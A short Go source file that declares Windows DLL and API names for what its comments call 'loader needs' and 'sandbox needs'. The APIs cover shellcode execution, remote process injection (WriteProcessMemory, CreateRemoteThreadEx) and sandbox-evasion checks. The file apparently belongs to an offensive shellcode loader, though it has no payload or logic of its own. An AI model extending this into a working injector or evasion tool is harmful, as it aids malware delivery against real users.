package wdll

import "syscall"

const (
	// dll needs
	kernel32DLL = "kernel32.dll"
	ntdllDLL    = "ntdll.dll"
	rpcrt4DLL   = "Rpcrt4.dll"

	// loader needs
	virtualAlloc         = "VirtualAlloc"
	virtualProtect       = "VirtualProtect"
	rtlCopyMemory        = "RtlCopyMemory"
	rtlCopyBytes         = "RtlCopyBytes"
	convertThreadToFiber = "ConvertThreadToFiber"
	createFiber          = "CreateFiber"
	switchToFiber        = "SwitchToFiber"
	getCurrentThread     = "GetCurrentThread"
	ntQueueApcThreadEx   = "NtQueueApcThreadEx"
	etwpCreateEtwThread  = "EtwpCreateEtwThread"
	waitForSingleObject  = "WaitForSingleObject"
	createThread         = "CreateThread"
	openProcess          = "OpenProcess"
	virtualAllocEx       = "VirtualAllocEx"
	virtualProtectEx     = "VirtualProtectEx"
	writeProcessMemory   = "WriteProcessMemory"
	createRemoteThreadEx = "CreateRemoteThreadEx"
	closeHandle          = "CloseHandle"
	heapCreate           = "HeapCreate"
	heapAlloc            = "HeapAlloc"
	enumSystemLocalesA   = "EnumSystemLocalesA"
	uuidFromStringA      = "UuidFromStringA"
	getCurrentProcess    = "GetCurrentProcess"

	// sandbox needs
	getTickCount                       = "GetTickCount"
	getPhysicallyInstalledSystemMemory = "GetPhysicallyInstalledSystemMemory"
)

type Dll struct {
	Kernel32 *syscall.LazyDLL
	Ntdll    *syscall.LazyDLL
	Rpcrt4   *syscall.LazyDLL
}

var DLink = &Dll{
	Kernel32: syscall.NewLazyDLL(kernel32DLL),
	Ntdll:    syscall.NewLazyDLL(ntdllDLL),
	Rpcrt4:   syscall.NewLazyDLL(rpcrt4DLL),
}
